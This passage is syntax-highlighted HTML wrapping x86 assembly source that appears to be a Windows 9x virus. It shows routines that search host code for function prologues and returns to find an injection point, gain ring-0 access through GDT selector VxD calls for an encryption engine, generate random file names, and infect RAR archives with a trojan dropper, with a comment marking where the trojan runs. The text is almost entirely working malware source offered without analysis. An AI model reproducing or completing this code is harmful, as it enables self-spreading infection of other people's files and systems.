</span><span class="sc5">SZ_STORE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">SZ_STORE</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;RETURN: EAX - ENTRY TO INTRUDING</span><span class="sc0">
</span><span class="sc5">NO_ENDP</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">LIST_EMPTY</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RANDOM</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">ESP</span><span class="sc4">+</span><span class="sc8">EAX</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">CLEAR_STACK</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">CLEAR_STACK</span><span class="sc0">
</span><span class="sc5">LIST_EMPTY</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc5">FIND_PLACE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
</span><span class="sc5">FIND_ENDP</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0C3H</span><span class="sc0">         </span><span class="sc1">;RETN</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">FOUND_RETN</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0C2H</span><span class="sc0">         </span><span class="sc1">;RETN X</span><span class="sc0">
        </span><span class="sc6">LOOPNE</span><span class="sc0">  </span><span class="sc5">FIND_ENDP</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_ENDP</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">         </span><span class="sc1">;SKIP X</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
</span><span class="sc5">FOUND_RETN</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc2">0FH</span><span class="sc4">+</span><span class="sc5">LEN_LOADER</span><span class="sc0">
        </span><span class="sc6">JL</span><span class="sc0">  </span><span class="sc5">NO_ENDP</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">FIND_PROC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">55H</span><span class="sc0">          </span><span class="sc1">;PUSH BP</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_PUSH_BP</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc2">0EC8BH</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">FOUND_PROC</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc2">0E589H</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">FOUND_PROC</span><span class="sc0">
</span><span class="sc5">NO_PUSH_BP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0C8H</span><span class="sc0">         </span><span class="sc1">;ENTER X,0</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_ENTER</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">FOUND_PROC</span><span class="sc0">
</span><span class="sc5">NO_ENTER</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">53H</span><span class="sc0">          </span><span class="sc1">;PUSH EBX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_PUSH_EBX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc2">5756H</span><span class="sc0">   </span><span class="sc1">;PUSH ESI/PUSH EDI</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">FOUND_PROC</span><span class="sc0">
</span><span class="sc5">NO_PUSH_EBX</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">81H</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_SUBADD</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc2">0ECH</span><span class="sc0">    </span><span class="sc1">;SUB ESP,X</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">FOUND_PROC</span><span class="sc0">
</span><span class="sc5">NO_SUBADD</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0CH</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">FIND_PROC</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">JAE</span><span class="sc0"> </span><span class="sc5">FIND_PROC</span><span class="sc0">
</span><span class="sc5">FOUND_PROC</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">FIND_ENDP</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">LEN_LOADER</span><span class="sc0">
</span><span class="sc5">FIND_ENDP_X</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0C2H</span><span class="sc0">         </span><span class="sc1">;RETN/RETN X</span><span class="sc0">
        </span><span class="sc6">LOOPNE</span><span class="sc0">  </span><span class="sc5">FIND_ENDP_X</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">FIND_ENDP</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">FIND_ENDP</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;ENTRY: EDI=&amp;NAME BUFFER</span><span class="sc0">
</span><span class="sc5">GEN_NAME</span><span class="sc0">    </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RANDOM_BYTE</span><span class="sc0">
</span><span class="sc5">GEN_EXT</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">;3-5 LETTERS</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0">
</span><span class="sc5">NEXT_RCHAR</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc4">-</span><span class="sc12">'A'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RANDOM_BYTE</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">NEXT_RCHAR</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;ENTRY: EDX=MEM DELTA</span><span class="sc0">
</span><span class="sc1">;EXIT: ECX=LENGTH OF DROPPER (EBX,EDX PRESERVED),ESI=&amp;ENCRYPT_BUFF</span><span class="sc0">
</span><span class="sc5">SPE_THUNK</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">RET_2_32</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">SHRD</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">         </span><span class="sc1">;0</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">10011010B</span><span class="sc0">        </span><span class="sc1">;P=1/DPL=0/S=1/NON-CONF/READ=1/ACCESS=0</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">ALLOCATE_GDT_SELECTOR</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">VXD_CALL</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">         </span><span class="sc1">;CODE SELECTOR</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">10010010B</span><span class="sc0"> </span><span class="sc1">;P=1/DPL=0/S=1/DATA/TOP/WRITE=1/ACCESS=0</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">VXD_CALL</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">CLI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">         </span><span class="sc1">;FREE_GDT_SELECTOR</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc5">OFF_SPE</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">66H</span><span class="sc0">
        </span><span class="sc6">RETF</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">RET_2_32</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SS</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">STI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">VXD_CALL</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">VXD_CALL</span><span class="sc0">
        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">ENCRYPT_BUFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">INF_RAR</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc5">RAR_SIGN</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">EXIT_RAR_TOP</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;VOLUME</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">EXIT_RAR_TOP</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">20H</span><span class="sc0">     </span><span class="sc1">;SKIP AUTHEN. BIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">RAR_HEAD_HDR</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_CRC32</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">RAR_HEAD_HDR</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">WRITE_FILE</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">EXIT_RAR_TOP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">ESI.RAR_HEAD_SIZE</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">READ_RAR_FH</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">RAR_FILE_HDR</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ZIP_READ_FILE</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">RAR_READ_OK</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JS</span><span class="sc0">  </span><span class="sc5">GO_RAR_DONE</span><span class="sc0">
</span><span class="sc5">EXIT_RAR_TOP</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc5">RAR_READ_OK</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.RAR_F_HEAD_TYPE</span><span class="sc4">],</span><span class="sc5">RAR_FILE_SIGN</span><span class="sc0">
</span><span class="sc5">GO_RAR_DONE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">RAR_DONE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.RAR_F_HEAD_FLAGS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">11100000B</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">11100000B</span><span class="sc0">            </span><span class="sc1">;DIR?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">SKIP_EXE_RAR</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">ZIP_FILE_COUNTER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.RAR_METHOD</span><span class="sc4">],</span><span class="sc5">RAR_STORED</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_INF_RAR</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.RAR_FILE_TIME</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_INF_RAR</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.RAR_FILE_DATE</span><span class="sc4">],</span><span class="sc5">TROJAN_STAMP</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">EXIT_RAR_TOP</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">RAR_FNAME</span><span class="sc4">+</span><span class="sc5">TROJAN_NAME_SIZE</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">MAIN_BUFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">SIZE_MBUFF</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">ZIP_READ_FILE</span><span class="sc0">           </span><span class="sc1">;RUN TROJAN</span><span class="sc0">
</span><span class="sc5">NO_INF_RAR</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,[</span><span class="sc5">ESI.RAR_FNAME_SIZE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">OUR_RAR_FHEADER.RAR_FNAME</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">RAR_FNAME</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">TEST_EXEC</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">SKIP_EXE_RAR</span><span class="sc0">
